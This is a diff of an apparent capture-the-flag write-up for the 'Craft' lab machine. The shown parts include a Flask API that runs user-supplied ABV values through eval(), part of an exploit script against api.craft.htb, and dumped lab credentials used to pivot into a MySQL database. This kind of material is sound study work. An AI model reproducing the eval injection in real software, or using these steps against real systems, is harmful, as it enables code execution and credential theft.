@@ -286,7 +286,7 @@ Today I&amp;rsquo;m going to exploit some poor programming decisions and leverag
 </span><span style="color:#e6db74">    Creates a new brew entry.
 </span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
 
-    <span style="color:#75715e"># make sure the ABV value is sane.</span>
+    <span style="color:#75715e"># make sure the ABV value is sane.</span>
     <span style="color:#66d9ef">if</span> eval(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &gt; 1&#39;</span> <span style="color:#f92672">%</span> request<span style="color:#f92672">.</span>json[<span style="color:#e6db74">&#39;abv&#39;</span>]):
         <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;ABV must be a decimal value less than 1.0&#34;</span>, <span style="color:#ae81ff">400</span>
     <span style="color:#66d9ef">else</span>:
@@ -312,11 +312,11 @@ token <span style="color:#f92672">=</span>  json_response[<span style="color:#e6
 
 headers <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;X-Craft-API-Token&#39;</span>: token, <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>  }
 
-<span style="color:#75715e"># make sure token is valid</span>
+<span style="color:#75715e"># make sure token is valid</span>
 response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;https://api.craft.htb/api/auth/check&#39;</span>, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span>False)
 <span style="color:#66d9ef">print</span>(response<span style="color:#f92672">.</span>text)
 
-<span style="color:#75715e"># create a sample brew with bogus ABV... should fail.</span>
+<span style="color:#75715e"># create a sample brew with bogus ABV... should fail.</span>
 
 <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Create bogus ABV brew&#34;</span>)
 brew_dict <span style="color:#f92672">=</span> {}
@@ -410,18 +410,18 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 <hr>
 <h1 id="pivoting-for-more-access">Pivoting for More Access</h1>
 <p>Now I might have a full TTY shell, but I still have very limited access. I did some poking around and found a settings.py file with a bunch of secrets for the API:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Flask settings</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Flask settings</span>
 FLASK_SERVER_NAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;api.craft.htb&#39;</span>
-FLASK_DEBUG <span style="color:#f92672">=</span> False  <span style="color:#75715e"># Do not use debug mode in production</span>
+FLASK_DEBUG <span style="color:#f92672">=</span> False  <span style="color:#75715e"># Do not use debug mode in production</span>
 
-<span style="color:#75715e"># Flask-Restplus settings</span>
+<span style="color:#75715e"># Flask-Restplus settings</span>
 RESTPLUS_SWAGGER_UI_DOC_EXPANSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;list&#39;</span>
 RESTPLUS_VALIDATE <span style="color:#f92672">=</span> True
 RESTPLUS_MASK_SWAGGER <span style="color:#f92672">=</span> False
 RESTPLUS_ERROR_404_HELP <span style="color:#f92672">=</span> False
 CRAFT_API_SECRET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hz66OCkDtv8G6D&#39;</span>
 
-<span style="color:#75715e"># database</span>
+<span style="color:#75715e"># database</span>
 MYSQL_DATABASE_USER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;craft&#39;</span>
 MYSQL_DATABASE_PASSWORD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qLGockJ6G2J75O&#39;</span>
 MYSQL_DATABASE_DB <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;craft&#39;</span>
@@ -432,12 +432,12 @@ SQLALCHEMY_TRACK_MODIFICATIONS <span style="color:#f92672">=</span> False
 </code></pre></div><p>Searching this key reveals that it&rsquo;s part of a python 3.6 docker instance. Hmmm, I need to escape this docker instance somehow. I have doubts that it will be via an exploit, rather it will probably involve the found credentials and API key.</p>
 <p>So let&rsquo;s see if we can access the database. I can modify the DB test script to do this since the database is only available internally. I could also set up a proxy and use a mySQL client, but the python is already set up to work so I&rsquo;m going to take the path of least resistance here.</p>
 <p>Here&rsquo;s my modified DBTest script:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
 
 <span style="color:#f92672">import</span> pymysql
 <span style="color:#f92672">from</span> craft_api <span style="color:#f92672">import</span> settings
 
-<span style="color:#75715e"># test connection to mysql database</span>
+<span style="color:#75715e"># test connection to mysql database</span>
 
 connection <span style="color:#f92672">=</span> pymysql<span style="color:#f92672">.</span>connect(host<span style="color:#f92672">=</span>settings<span style="color:#f92672">.</span>MYSQL_DATABASE_HOST,
                              user<span style="color:#f92672">=</span>settings<span style="color:#f92672">.</span>MYSQL_DATABASE_USER,
